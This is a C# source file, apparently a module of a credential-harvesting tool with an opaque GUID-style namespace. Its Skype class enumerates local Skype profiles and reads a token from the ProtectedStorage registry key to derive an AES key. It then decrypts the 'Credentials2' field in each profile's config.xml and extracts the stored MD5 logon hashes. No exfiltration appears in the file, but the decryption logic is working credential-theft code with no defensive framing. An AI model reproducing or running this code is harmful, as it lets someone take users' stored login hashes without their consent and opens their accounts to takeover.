using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Xml;
using Microsoft.Win32;

namespace FE3458D878534D9183D79D9318BB08C0.Data
{
	public class Skype : CDataStructures.Skype, DataStructures.ISyncData
	{
		#region Constructors
		public Skype()
		{
			DirectoryInfo ProfilesPath = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Skype"));

			if (ProfilesPath.Exists)
				this.Profiles = ProfilesPath.GetDirectories().Where(Dir => !Skype.IgnoreDirectories.Contains(Dir.Name)).ToArray();
		}

		public Skype(params string[] Profiles)
		{
			string ProfilesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Skype");

			if (Directory.Exists(ProfilesPath))
				this.Profiles = Profiles.Select(Profile => new DirectoryInfo(Path.Combine(ProfilesPath, Profile))).Distinct().ToArray();
		}

		public Skype(params DirectoryInfo[] Profiles)
		{
			this.Profiles = Profiles.Distinct().ToArray();
		}
		#endregion

		#region Members
		private static readonly string[] IgnoreDirectories = new string[]
		{
			"Content",
			"My Skype Received Files",
			"Pictures",
			"shared_dynco",
			"shared_html",
			"shared_httpfe"
		};

		private DirectoryInfo[] Profiles = new DirectoryInfo[0];
		#endregion

		#region Properties
		public override CDataStructures.DataTypes.sSkypeUser[] Users
		{
			get
			{
				if (this.Disposed)
					throw new ObjectDisposedException(this.GetType().FullName);

				return this.Properties.GetSetProperty<CDataStructures.DataTypes.sSkypeUser[]>("Users", this.GetUsers);
			}
		}
		#endregion

		#region Methods
		protected override void Dispose(bool Disposing)
		{
			if (!this.Disposed)
			{
				if (Disposing)
				{
					if (this.Profiles != null)
					{
						Array.Clear(this.Profiles, 0, this.Profiles.Length);
						this.Profiles = null;
					}
				}
			}

			base.Dispose(Disposing);
		}

		public void Initiate()
		{
			this.Retrieved = DateTime.UtcNow;

			this.Users.ToString();
		}

		public CDataStructures.DataTypes.sSkypeUser[] GetUsers()
		{
			List<CDataStructures.DataTypes.sSkypeUser> rData = new List<CDataStructures.DataTypes.sSkypeUser>();

			if (this.Profiles.Length == 0)
				return rData.ToArray();

			try
			{
				using (AesCryptoServiceProvider AES = new AesCryptoServiceProvider()
				{
					BlockSize = 128,
					KeySize = 256,
					Mode = CipherMode.ECB,
					Padding = PaddingMode.None
				})
				using (MD5CryptoServiceProvider MD5 = new MD5CryptoServiceProvider())
				{
					byte[] Key;

					using (RegistryKey ProtectedStorage = Registry.CurrentUser.OpenSubKey(@"Software\Skype\ProtectedStorage"))
					using (SHA1CryptoServiceProvider SHA1 = new SHA1CryptoServiceProvider())
					{
						byte[] Token = ProtectedStorage.GetValue("0") as byte[];

						if (Token == null)
							return rData.ToArray();

						Key = SHA1.ComputeHash(Token);
						Array.Resize(ref Key, AES.KeySize / 8);

						//for (int i = SHA1.HashSize / 8; i < Key.Length; i++)
						//	Key[i] = (byte)(Key.Length - SHA1.HashSize / 8);
					}

					using (ICryptoTransform AESDecryptor = AES.CreateDecryptor(Key, null))
					{
						foreach (DirectoryInfo Profile in this.Profiles)
						{
							if (!Profile.Exists)
								continue;

							string ConfigPath = Path.Combine(Profile.FullName, "config.xml");

							if (!File.Exists(ConfigPath))
								continue;

							XmlDocument Doc = new XmlDocument();
							Doc.XmlResolver = null;
							Doc.Load(ConfigPath);

							XmlNode Credentials2Node = Doc.SelectSingleNode("/config/Lib/Account/Credentials2");

							if (Credentials2Node == null
								|| Utilities.String_IsNullOrWhiteSpace(Credentials2Node.InnerText))
								continue;

							byte[] Credentials2 = Utilities.FromHEX(Credentials2Node.InnerText);

							if (Credentials2 == null)
								continue;

							Credentials2 = AESDecryptor.TransformFinalBlock(Credentials2, 0, Credentials2.Length - Credentials2.Length % (AES.BlockSize / 8));

							byte[] Hash = new byte[MD5.HashSize / 8];
							Buffer.BlockCopy(Credentials2, 0, Hash, 0, Hash.Length);

							///////////

							rData.Add(new CDataStructures.DataTypes.sSkypeUser
							{
								LogonHash = Hash
							});
						}
					}
				}
			}
			catch (Exception e)
			{
				Utilities.Log(e);
			}

			return rData.Distinct().ToArray();
		}
		#endregion
	}
}